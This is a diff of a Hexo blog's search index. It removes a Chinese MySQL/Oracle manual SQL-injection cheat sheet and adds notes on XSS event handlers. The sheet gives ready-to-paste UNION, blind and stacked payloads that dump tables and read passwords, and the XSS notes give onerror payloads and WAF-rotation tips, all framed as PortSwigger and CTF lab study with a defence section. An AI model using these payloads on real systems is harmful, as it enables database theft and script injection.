-<h2 id="避坑提醒"><a href="#避坑提醒" class="headerlink" title="避坑提醒"></a>避坑提醒</h2><p>很多 WAF 会拦截常见事件，遇到过滤可以轮换试：</p>
-<p><code>onmouseover</code>被拦 → 换<code>onfocus</code>；<code>onerror</code>被拦 → 换<code>onload</code></p>
-]]></content>
-      <categories>
-        <category>技术</category>
-        <category>基础漏洞</category>
-        <category>XSS</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Oracle sql</title>
-    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SQLi/Oracle%20sql/</url>
-    <content><![CDATA[<span id="more"></span>
-<h1 id="MySQL-Oracle-手工-SQL-注入-整合完整版手册"><a href="#MySQL-Oracle-手工-SQL-注入-整合完整版手册" class="headerlink" title="MySQL &amp; Oracle 手工 SQL 注入 整合完整版手册"></a>MySQL &amp; Oracle 手工 SQL 注入 整合完整版手册</h1><blockquote>
-<p>适用：PortSwigger 靶场、CTF 手工注入</p>
-<p>Payload 全部为<strong>原始文本，直接粘贴进 Burp Repeater 参数 value 框，不用手动 URL 编码</strong></p>
-<p>核心原理两者完全一致：<strong>用户可控输入直接拼接进 SQL 字符串，未使用预编译，导致注入</strong></p>
-<p>预编译局限：只能防护 WHERE 条件里的值；<strong>ORDER BY&#x2F;GROUP BY 这类 SQL 结构拼接，预编译无效，只能白名单</strong></p>
-</blockquote>
-<hr>
-<h2 id="一、系统元数据映射（最重要！）"><a href="#一、系统元数据映射（最重要！）" class="headerlink" title="一、系统元数据映射（最重要！）"></a>一、系统元数据映射（最重要！）</h2><table>
-<thead>
-<tr>
-<th>功能</th>
-<th>MySQL</th>
-<th>Oracle</th>
-<th>备注</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>查询所有表</td>
-<td><code>information_schema.tables</code></td>
-<td><code>all_tables</code> &#x2F; <code>user_tables</code></td>
-<td><code>user_tables</code>只看当前用户自己的表，注入优先用；<code>all_tables</code>能看当前用户有权限访问的所有表；<code>dba_tables</code>需要 DBA 权限</td>
-</tr>
-<tr>
-<td>查询所有列</td>
-<td><code>information_schema.columns</code></td>
-<td><code>all_tab_columns</code> &#x2F; <code>user_tab_columns</code></td>
-<td>视图里的字段名都叫<code>table_name</code>、<code>column_name</code>，只是存放位置不同</td>
-</tr>
-<tr>
-<td>筛选当前库 &#x2F;schema</td>
-<td><code>table_schema=database()</code></td>
-<td><code>owner=USER</code></td>
-<td>MySQL 叫数据库；Oracle 叫 Schema (用户)</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p>记忆口诀：</p>
-<p>MySQL：查表、列都在<code>information_schema</code>里面</p>
-<p>Oracle：没有<code>information_schema</code>，用<code>user_tables</code>&#x2F;<code>user_tab_columns</code>（优先）</p>
-</blockquote>
-<hr>
-<h2 id="二、基础语法-注入常用函数对比"><a href="#二、基础语法-注入常用函数对比" class="headerlink" title="二、基础语法 &amp; 注入常用函数对比"></a>二、基础语法 &amp; 注入常用函数对比</h2><p>![[Pasted image 20261015210139.png|700]]</p>
-<h3 id="关键名词解释"><a href="#关键名词解释" class="headerlink" title="关键名词解释"></a>关键名词解释</h3><ol>
-<li><strong>dual</strong>：Oracle 虚拟伪表，只有一行空数据。Oracle 语法强制 SELECT 必须带 FROM，查常量、函数结果没有真实表时，用<code>FROM dual</code>占位。</li>
-<li><strong>ROWNUM</strong>：Oracle 伪列，不是表真实字段。查询输出结果之后，按顺序给每行分配编号，从 1 开始。只能直接用<code>ROWNUM=1</code>获取第一条。</li>
-<li><strong>LISTAGG</strong>：Oracle 聚合函数，把多条查询结果合并为一行字符串，自定义分隔符。靶场表少的时候，一次性爆出全部表 &#x2F; 列。超过 4000 字符失效，改用<code>ROWNUM+NOT IN</code>逐行获取。</li>
-</ol>
-<hr>
-<h2 id="三、注入通用流程（MySQL、Oracle-一样）"><a href="#三、注入通用流程（MySQL、Oracle-一样）" class="headerlink" title="三、注入通用流程（MySQL、Oracle 一样）"></a>三、注入通用流程（MySQL、Oracle 一样）</h2><ol>
-<li>找注入点：输入单引号<code>&#39;</code>，观察页面是否报错</li>
-<li><code>ORDER BY</code> 猜查询返回的列数量</li>
-<li>UNION SELECT，匹配<strong>列数量</strong>和<strong>列数据类型</strong></li>
-<li>查询版本 → 查询表名 → 查询列名 → 查询表内数据</li>
-</ol>
-<blockquote>
-<p>下面 Payload 统一场景：原始查询返回 2 列，注入点 category，原始 SQL：<code>SELECT name,description FROM products WHERE category=&#39;$cat&#39; AND released=1</code></p>
-</blockquote>
-<h3 id="UNION-联合注入（有回显，优先使用）"><a href="#UNION-联合注入（有回显，优先使用）" class="headerlink" title="UNION 联合注入（有回显，优先使用）"></a>UNION 联合注入（有回显，优先使用）</h3><h4 id="MySQL-Payload"><a href="#MySQL-Payload" class="headerlink" title="MySQL Payload"></a>MySQL Payload</h4><p>plaintext</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT VERSION(),DATABASE() -- </span><br></pre></td></tr></table></figure>
-
-<p>一次性爆全部表</p>
-<p>plaintext</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT GROUP_CONCAT(table_name,&#x27;:&#x27;),null FROM information_schema.tables WHERE table_schema=DATABASE() -- </span><br></pre></td></tr></table></figure>
-
-<p>一次性爆目标表所有列（假设表 users）</p>
-<p>plaintext</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT GROUP_CONCAT(column_name,&#x27;:&#x27;),null FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=&#x27;users&#x27; -- </span><br></pre></td></tr></table></figure>
-
-<p>读取数据</p>
-<p>plaintext</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT username,password FROM users LIMIT 0,1 -- </span><br></pre></td></tr></table></figure>
-
-<h4 id="Oracle-Payload（PortSwigger-靶场直接复制）"><a href="#Oracle-Payload（PortSwigger-靶场直接复制）" class="headerlink" title="Oracle Payload（PortSwigger 靶场直接复制）"></a>Oracle Payload（PortSwigger 靶场直接复制）</h4><p>测试 dual，验证 UNION 是否通</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT &#x27;test123&#x27;,null FROM dual -- </span><br></pre></td></tr></table></figure>
-
-<p>查询版本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT banner,null FROM v$version -- </span><br></pre></td></tr></table></figure>
-
-<p>一次性爆出当前用户全部表（listagg 推荐）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT listagg(table_name,&#x27;:&#x27;) within group (order by table_name),null FROM user_tables -- </span><br></pre></td></tr></table></figure>
-
-<p>一次性爆出目标表所有列（假设表 USERS，大写）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT listagg(column_name,&#x27;:&#x27;) within group (order by column_name),null FROM user_tab_columns WHERE table_name=&#x27;USERS&#x27; -- </span><br></pre></td></tr></table></figure>
-
-<p>读取表内数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT USERNAME,PASSWORD FROM USERS WHERE ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
-
-<h5 id="listagg-失效备选：逐行获取（ROWNUM-NOT-IN）"><a href="#listagg-失效备选：逐行获取（ROWNUM-NOT-IN）" class="headerlink" title="listagg 失效备选：逐行获取（ROWNUM + NOT IN）"></a>listagg 失效备选：逐行获取（ROWNUM + NOT IN）</h5><p>拿第一张表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT table_name,null FROM user_tables WHERE ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
-
-<p>拿到第一张表（例：PRODUCTS），填入 NOT IN，拿第二张</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT table_name,null FROM user_tables WHERE ROWNUM=1 AND table_name NOT IN (&#x27;PRODUCTS&#x27;) -- </span><br></pre></td></tr></table></figure>
-
-<p>原理：剔除已经获取到的数据，剩下结果集再取第一条，绕开<code>ROWNUM!=2</code>的限制。</p>
-<hr>
-<h2 id="四、其他注入类型-Payload"><a href="#四、其他注入类型-Payload" class="headerlink" title="四、其他注入类型 Payload"></a>四、其他注入类型 Payload</h2><h3 id="1-报错注入"><a href="#1-报错注入" class="headerlink" title="1. 报错注入"></a>1. 报错注入</h3><p>MySQL</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND updatexml(1,concat(0x7e,VERSION(),0x7e),1) -- </span><br></pre></td></tr></table></figure>
-
-<p>Oracle（环境依赖，经常失效）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND utl_inaddr.get_host_name((SELECT table_name FROM user_tables WHERE ROWNUM=1)) -- </span><br></pre></td></tr></table></figure>
-
-<h3 id="2-布尔盲注（页面只有正常-空白两种状态，无回显）"><a href="#2-布尔盲注（页面只有正常-空白两种状态，无回显）" class="headerlink" title="2. 布尔盲注（页面只有正常 &#x2F; 空白两种状态，无回显）"></a>2. 布尔盲注（页面只有正常 &#x2F; 空白两种状态，无回显）</h3><p>MySQL</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND SUBSTRING(DATABASE(),1,1)=&#x27;a&#x27; -- </span><br></pre></td></tr></table></figure>
-
-<p>Oracle</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND SUBSTR(USER,1,1)=&#x27;S&#x27; AND ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Oracle 截取函数：<code>SUBSTR(字符串,起始位置,长度)</code></p>
-</blockquote>
-<h3 id="3-时间盲注（页面无任何差异，依靠延时判断真假）"><a href="#3-时间盲注（页面无任何差异，依靠延时判断真假）" class="headerlink" title="3. 时间盲注（页面无任何差异，依靠延时判断真假）"></a>3. 时间盲注（页面无任何差异，依靠延时判断真假）</h3><p>MySQL</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND IF(SUBSTRING(DATABASE(),1,1)=&#x27;a&#x27;,SLEEP(5),1) -- </span><br></pre></td></tr></table></figure>
-
-<p>Oracle</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND (CASE WHEN SUBSTR(USER,1,1)=&#x27;S&#x27; THEN DBMS_PIPE.RECEIVE_MESSAGE(&#x27;a&#x27;,5) ELSE NULL END) AND ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
-
-<h3 id="4-堆叠注入"><a href="#4-堆叠注入" class="headerlink" title="4. 堆叠注入"></a>4. 堆叠注入</h3><p>MySQL 可用，Oracle 完全无效</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;INSERT INTO users VALUES(&#x27;test&#x27;,&#x27;123456&#x27;); -- </span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="五、防御方案（MySQL、Oracle-通用）"><a href="#五、防御方案（MySQL、Oracle-通用）" class="headerlink" title="五、防御方案（MySQL、Oracle 通用）"></a>五、防御方案（MySQL、Oracle 通用）</h2><ol>
-<li><p><strong>首选：参数化预编译 PreparedStatement</strong></p>
-<p>  防护 WHERE 子句参数值注入</p>
-<p>  <strong>无法防御 ORDER BY、GROUP BY 这类 SQL 结构拼接，结构类只能白名单</strong></p>
-</li>
-<li><p>最小权限原则：数据库账号只分配业务必需权限，不要 DBA 管理员权限</p>
-</li>
-<li><p>输入校验：白名单 &gt; 黑名单，黑名单容易绕过</p>
-</li>
-<li><p>禁用危险函数 &#x2F; 包</p>
-<ul>
-<li>MySQL：限制<code>secure_file_priv</code>，禁止<code>into outfile</code>写文件</li>
-<li>Oracle：配置 ACL，禁用<code>utl_inaddr</code>、<code>utl_http</code></li>
-</ul>
-</li>
-<li><p>转义函数仅作为辅助防护，存在宽字节注入等绕过方式，不能单独防御注入</p>
-</li>
-<li><p>WAF 属于辅助防护，存在大量绕过手段，不能单独依赖</p>
-</li>
-</ol>
-<hr>
-<h2 id="六、高频坑点汇总"><a href="#六、高频坑点汇总" class="headerlink" title="六、高频坑点汇总"></a>六、高频坑点汇总</h2><h3 id="Oracle-坑"><a href="#Oracle-坑" class="headerlink" title="Oracle 坑"></a>Oracle 坑</h3><ol>
-<li>常量查询必须写<code>FROM dual</code>，直接<code>SELECT &#39;xxx&#39;</code>语法报错</li>
-<li><code>ROWNUM=2</code>直接查询永远为空；listagg 超长报错才用<code>ROWNUM+NOT IN</code>循环爆数据</li>
-<li>UNION 列类型必须严格匹配，不确定就用 null 占位</li>
-<li>表名字典内大写，匹配时引号内必须大写</li>
-<li>注释不能用<code>#</code>，只能<code>--</code> 或者<code>/* */</code></li>
-<li>不支持堆叠注入，分号<code>;</code>不能执行第二条 SQL</li>
-<li>优先使用<code>user_tables</code>&#x2F;<code>user_tab_columns</code>，减少无关数据干扰</li>
-</ol>
-<h3 id="MySQL-坑"><a href="#MySQL-坑" class="headerlink" title="MySQL 坑"></a>MySQL 坑</h3><ol>
-<li><code>GROUP_CONCAT</code>有长度上限，过长会截断</li>
-<li><code>||</code>不是字符串拼接，要用<code>CONCAT()</code></li>
-<li><code>LIMIT m,n</code>：跳过 m 行，取 n 行</li>
-</ol>
-<hr>
-<h2 id="七、最简实操顺序（PortSwigger-Oracle-Lab）"><a href="#七、最简实操顺序（PortSwigger-Oracle-Lab）" class="headerlink" title="七、最简实操顺序（PortSwigger Oracle Lab）"></a>七、最简实操顺序（PortSwigger Oracle Lab）</h2><ol>
-<li><code>ORDER BY</code> 判断列数</li>
-<li><code>Gifts&#39; UNION SELECT &#39;test123&#39;,null FROM dual --</code> 验证 UNION 注入</li>
-<li>listagg 一次性拿全部表名</li>
-<li>listagg 拿目标表全部列名</li>
-<li>UNION SELECT 列 1, 列 2 FROM 目标表 WHERE ROWNUM&#x3D;1 – 读取账号密码</li>
-</ol>
-]]></content>
-      <categories>
-        <category>技术</category>
-        <category>基础漏洞</category>
-        <category>SQLi</category>
-      </categories>
-      <tags>
-        <tag>Orclesql</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>XSS深化总结</title>
     <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XSS/XSS%E6%B7%B1%E5%8C%96%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<span id="more"></span>
@@ -1906,6 +1455,77 @@
 <p><strong>修复写法</strong>：替换安全DOM API，禁止解析HTML</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> name = location.<span class="property">search</span>.<span class="title function_">split</span>(<span class="string">&#x27;name=&#x27;</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 安全写法：innerText仅渲染纯文本，不解析标签、事件</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;box&quot;</span>).<span class="property">innerText</span> = name;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
+]]></content>
+      <categories>
+        <category>技术</category>
+        <category>基础漏洞</category>
+        <category>XSS</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>XSS 高频事件</title>
+    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XSS/XSS%20%E9%AB%98%E9%A2%91%E4%BA%8B%E4%BB%B6/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="XSS-高频事件（"><a href="#XSS-高频事件（" class="headerlink" title="XSS 高频事件（"></a>XSS 高频事件（</h1><blockquote>
+<p>场景：<code>&lt; &gt;</code>被过滤，不能注入<code>&lt;script&gt;</code>标签，<strong>只能给已有 HTML 标签追加事件属性</strong>，事件触发就执行 JS。</p>
+</blockquote>
+<h2 id="鼠标事件（最常用，level3-就是这类）"><a href="#鼠标事件（最常用，level3-就是这类）" class="headerlink" title="鼠标事件（最常用，level3 就是这类）"></a>鼠标事件（最常用，level3 就是这类）</h2><ul>
+<li><code>onclick</code>：鼠标<strong>单击</strong>元素触发（level3 用的）</li>
+<li><code>ondblclick</code>：鼠标<strong>双击</strong>触发</li>
+<li><code>onmouseover</code>：鼠标<strong>悬浮放上去</strong>就触发（推荐，不用点击）</li>
+<li><code>onmouseout</code>：鼠标<strong>移开</strong>元素触发</li>
+<li><code>onmousemove</code>：鼠标在元素上移动持续触发</li>
+<li><code>oncontextmenu</code>：<strong>右键菜单</strong>（右键点击）触发</li>
+</ul>
+<h2 id="焦点-键盘事件（input-输入框神器，XSSlab-高频）"><a href="#焦点-键盘事件（input-输入框神器，XSSlab-高频）" class="headerlink" title="焦点 &#x2F; 键盘事件（input 输入框神器，XSSlab 高频）"></a>焦点 &#x2F; 键盘事件（input 输入框神器，XSSlab 高频）</h2><ul>
+<li><code>onfocus</code>：元素<strong>获得焦点</strong>（点进输入框）触发</li>
+<li><code>onblur</code>：元素<strong>失去焦点</strong>（点别处）触发</li>
+<li><code>onkeydown</code>：按下按键瞬间触发</li>
+<li><code>onkeyup</code>：松开按键触发</li>
+<li><code>onkeypress</code>：按键按下并产生字符时触发</li>
+</ul>
+<h2 id="加载-错误事件（可以页面加载自动执行，不需要用户交互！重点）"><a href="#加载-错误事件（可以页面加载自动执行，不需要用户交互！重点）" class="headerlink" title="加载 &#x2F; 错误事件（可以页面加载自动执行，不需要用户交互！重点）"></a>加载 &#x2F; 错误事件（可以页面加载自动执行，不需要用户交互！重点）</h2><blockquote>
+<p>这类最好用，不用用户点、不用悬浮，页面渲染直接弹</p>
+</blockquote>
+<ul>
+<li><code>onload</code>：<strong>元素加载成功</strong>触发（img、svg、iframe、body）</li>
+<li><code>onerror</code>：<strong>元素加载失败</strong>触发，最经典！</li>
+</ul>
+<blockquote>
+<p>示例：<code>&lt;img src=x onerror=alert(1)&gt;</code> src&#x3D;x 图片不存在，直接执行 JS</p>
+</blockquote>
+<ul>
+<li><code>onpageshow</code>：页面展示时触发（body）</li>
+</ul>
+<h2 id="表单、内容事件"><a href="#表单、内容事件" class="headerlink" title="表单、内容事件"></a>表单、内容事件</h2><ul>
+<li><code>onchange</code>：输入框内容改变、下拉框切换触发</li>
+<li><code>onselect</code>：选中输入框里面文字时触发</li>
+<li><code>oncopy</code>：复制内容触发</li>
+<li><code>oncut</code>：剪切内容触发</li>
+<li><code>onpaste</code>：粘贴内容触发</li>
+</ul>
+<h2 id="HTML5-新事件（过滤严格靶场备选）"><a href="#HTML5-新事件（过滤严格靶场备选）" class="headerlink" title="HTML5 新事件（过滤严格靶场备选）"></a>HTML5 新事件（过滤严格靶场备选）</h2><ul>
+<li><code>ontoggle</code>：<code>&lt;details&gt;</code>折叠面板展开 &#x2F; 收起触发</li>
+<li><code>onstart</code>：<code>&lt;marquee&gt;</code>滚动标签启动触发</li>
+</ul>
+<hr>
+<h1 id="两个重要分类（实战区分）"><a href="#两个重要分类（实战区分）" class="headerlink" title="两个重要分类（实战区分）"></a>两个重要分类（实战区分）</h1><ol>
+<li><strong>需要用户交互</strong>：<code>onclick / onmouseover / onfocus</code>（level3 用的，必须用户做动作）</li>
+<li><strong>无交互自动执行</strong>：<code>onerror、onload</code>（优先选！不需要用户点击，访问页面直接触发）</li>
+</ol>
+<blockquote>
+<p>举 onerror 例子：</p>
+<p>payload：<code>&#39;&gt;&lt;img src=x onerror=alert(1)//</code></p>
+<p>原理：图片地址<code>x</code>不存在，触发 onerror，自动执行 alert，不用任何点击。</p>
+</blockquote>
+<h2 id="靶场使用小规则（审计-payload-思路）"><a href="#靶场使用小规则（审计-payload-思路）" class="headerlink" title="靶场使用小规则（审计 payload 思路）"></a>靶场使用小规则（审计 payload 思路）</h2><ol>
+<li>上下文是 input 输入框：优先 <code>onfocus onmouseover onclick</code></li>
+<li>可以注入 img&#x2F;svg 标签：优先 <code>onerror / onload</code>，<strong>免交互</strong></li>
+<li>单引号闭合属性：payload 用 <code>&#39; 事件名=alert(1)//</code></li>
+<li>双引号闭合属性：payload 用 <code>&quot; 事件名=alert(1)//</code></li>
+</ol>
+<h2 id="避坑提醒"><a href="#避坑提醒" class="headerlink" title="避坑提醒"></a>避坑提醒</h2><p>很多 WAF 会拦截常见事件，遇到过滤可以轮换试：</p>
+<p><code>onmouseover</code>被拦 → 换<code>onfocus</code>；<code>onerror</code>被拦 → 换<code>onload</code></p>
 ]]></content>
       <categories>
         <category>技术</category>
